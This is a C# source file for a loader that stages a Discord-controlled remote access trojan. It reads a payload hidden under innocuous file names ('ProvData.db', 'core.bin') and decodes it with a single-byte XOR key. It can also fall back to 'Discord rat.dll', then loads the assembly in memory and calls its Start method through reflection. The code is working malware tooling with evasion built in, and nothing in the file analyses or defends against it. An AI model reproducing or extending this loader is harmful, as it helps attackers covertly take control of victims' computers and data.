using System;
using System.IO;
using System.Reflection;

namespace Loader
{
    internal static class Program
    {
        private const byte XorKey = 0xA7;

        [STAThread]
        private static void Main()
        {
            string baseDir = AppDomain.CurrentDomain.BaseDirectory;
            byte[] payloadBytes = LoadPayloadBytes(baseDir);
            if (payloadBytes == null || payloadBytes.Length == 0)
            {
                return;
            }

            Assembly payload = Assembly.Load(payloadBytes);
            Type programType = payload.GetType("Discord_rat.Program");
            if (programType == null)
            {
                return;
            }

            FieldInfo rootField = programType.GetField("PayloadRoot", BindingFlags.Public | BindingFlags.Static);
            if (rootField != null)
            {
                rootField.SetValue(null, baseDir);
            }

            MethodInfo startMethod = programType.GetMethod("Start", BindingFlags.Public | BindingFlags.Static);
            if (startMethod != null)
            {
                startMethod.Invoke(null, null);
            }
        }

        private static byte[] LoadPayloadBytes(string baseDir)
        {
            string[] protectedNames = { "ProvData.db", "core.bin" };
            foreach (string name in protectedNames)
            {
                string protectedPath = Path.Combine(baseDir, name);
                if (File.Exists(protectedPath))
                {
                    return XorDecode(File.ReadAllBytes(protectedPath));
                }
            }

            string devPath = Path.Combine(baseDir, "Discord rat.dll");
            if (File.Exists(devPath))
            {
                return File.ReadAllBytes(devPath);
            }

            return null;
        }

        private static byte[] XorDecode(byte[] data)
        {
            byte[] decoded = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
            {
                decoded[i] = (byte)(data[i] ^ XorKey);
            }
            return decoded;
        }
    }
}
